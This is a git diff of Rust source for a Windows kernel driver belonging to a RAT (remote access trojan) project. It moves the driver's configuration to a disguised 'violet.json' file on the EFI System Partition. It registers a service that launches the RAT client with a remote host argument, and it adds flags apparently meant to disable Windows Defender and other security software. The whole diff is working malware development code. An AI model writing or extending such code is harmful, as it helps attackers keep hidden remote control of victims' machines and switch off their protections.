@@ -1,8 +1,10 @@
 pub mod cleanup;
 
+use alloc::string::String;
 use alloc::{format, vec};
 use core::ffi::c_void;
 use core::ptr;
+use core::sync::atomic::Ordering;
 
 use const_format::formatcp;
 use rat_common::utils::DropGuard;
@@ -34,6 +36,7 @@ use crate::global::{
     MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_FILE_PATH, RAT_CLIENT_SERVICE_PATH,
     registry_key_attributes,
 };
+use crate::state::DRIVER_STATE;
 use crate::utils::windows_to_wdk_guid;
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
@@ -190,7 +193,7 @@ fn read_config() -> anyhow::Result<Config> {
                             let gpt = &unsafe { partition.Anonymous.Gpt };
                             if is_equal_guid(&gpt.PartitionType, &PARTITION_SYSTEM_GUID) {
                                 let path = format!(
-                                    "\\Device\\Harddisk{}\\Partition{}\\EFI\\Microsoft\\Boot\\config.json",
+                                    "\\Device\\Harddisk{}\\Partition{}\\EFI\\Microsoft\\Boot\\violet.json",
                                     devno.DeviceNumber,
                                     index + 1, // Index 0 is the physical disk itself e.g. "\Device\Harddisk0\DR0"
                                 );
@@ -239,6 +242,13 @@ fn read_config() -> anyhow::Result<Config> {
     anyhow::bail!("Cannot find EFI System Partition");
 }
 
+fn build_service_cmd_line(config: &Config) -> String {
+    format!(
+        "\"{RAT_CLIENT_SERVICE_PATH}\" --host {} --log-level {} --log-path \"%SystemRoot%\\System32\\{}\" --scm",
+        config.host, config.log_level, config.log_path,
+    )
+}
+
 fn setup_service_registry(config: &Config) -> anyhow::Result<()> {
     let mut name = UNICODE_STRING::default();
     let mut attributes = registry_key_attributes(&mut name);
@@ -261,7 +271,7 @@ fn setup_service_registry(config: &Config) -> anyhow::Result<()> {
         let _ = ZwClose(key);
     });
 
-    let path = format!("\"{RAT_CLIENT_SERVICE_PATH}\" {}", config.argument);
+    let path = build_service_cmd_line(config);
     let u_path = U16CString::from_str(&path)
         .map_err(|_| anyhow::anyhow!("Cannot convert {path:?} to U16CString"))?;
 
@@ -321,6 +331,19 @@ fn initialize() -> anyhow::Result<()> {
     setup_service_registry(&config).inspect_err(|e| {
         error!("Failed to setup service registry: {e}");
     })?;
+
+    // Set disable state
+    let state = DRIVER_STATE.load(Ordering::Acquire);
+    match unsafe { state.as_ref() } {
+        Some(state) => {
+            state.set_disable_wd(config.disable_wd);
+            state.set_disable_sd(config.disable_sd);
+        }
+        None => {
+            error!("Driver state must be initialized at this point");
+            anyhow::bail!("Driver state is uninitialized");
+        }
+    }
 
     Ok(())
 }
